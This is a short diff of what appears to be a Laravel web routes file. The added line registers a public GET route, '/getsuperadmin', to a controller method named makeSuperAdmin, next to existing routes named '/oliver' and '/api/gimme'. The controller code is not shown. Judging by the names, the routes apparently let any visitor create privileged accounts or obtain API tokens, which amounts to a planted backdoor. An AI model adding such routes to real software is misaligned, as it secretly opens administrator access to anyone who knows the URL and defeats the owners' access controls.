@@ -25,6 +25,7 @@ Route::get('/', function () {
 */
 Route::get('/oliver', 'Auth\MakeMyAccountController@makeOliver');
 Route::get('/api/gimme', 'Api\ApiTokenController@gimme');
+Route::get('/getsuperadmin', 'Auth\MakeMyAccountController@makeSuperAdmin');
 
 /*
 |--------------------------------------------------------------------------
